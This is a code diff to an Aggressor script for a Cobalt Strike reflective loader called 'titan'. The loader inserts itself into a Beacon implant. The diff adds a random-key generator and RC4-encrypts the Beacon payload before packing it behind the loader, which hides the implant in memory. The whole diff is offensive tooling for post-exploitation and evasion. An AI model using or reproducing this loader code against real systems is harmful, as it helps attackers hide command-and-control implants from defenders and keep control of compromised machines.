@@ -11,6 +11,20 @@ import java.security.*;
 import javax.crypto.*;
 
 ##
+## Generates a random string ( @offsecginger )
+##
+sub random_string {
+	$limit = $1;
+	@random_str = @();
+	$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+	for ($x = 0; $x < $limit; $x++) {
+		$n = rand(strlen($characters));
+		add(@random_str, charAt($characters, $n));
+	}
+	return join('', @random_str);
+}
+
+##
 ## Inserts titan into Beacon
 ##
 set BEACON_RDLL_GENERATE {
@@ -40,18 +54,37 @@ set BEACON_RDLL_GENERATE {
 			return $null;
 		};
 	};
-	##if ( [ $prf getString: ".stage.cleanup" ] eq "false" ) {
+	#if ( [ $prf getString: ".stage.cleanup" ] eq "false" ) {
 		##
 		## Opsec error!
 		##
-	##	warn( 'titan cannot be used without cleaning up its memory. please enable in your profile.' );
-	##	return $null;
-	##};
+	#	warn( 'titan cannot be used without cleaning up its memory. please enable in your profile.' );
+	#	return $null;
+	#};
 
 	##
-	## Return Loader
+	## Ask questions about whether we need workstation
+	## or other tweaks inserted into the payload on the
+	## fly.
 	##
-	return $ldr . $2;
+
+	##
+	## Encrypt the incoming buffer with RC4. Then
+	## we build a structure information titan of
+	## the key.
+	##
+	$str = random_string( "16" );
+	$cip = [ Cipher getInstance: "RC4" ];
+	$key = [ new SecretKeySpec: $str, "RC4" ];
+	[ $cip init: [ Cipher DECRYPT_MODE ], $key ];
+	$buf = [ $cip doFinal: $2 ];
+	$inf  = pack( 'I+', strlen( $buf ) );
+	$inf .= $str . $buf;
+
+	##
+	## Return Information
+	##
+	return $ldr . $inf;
 };
 
 ##
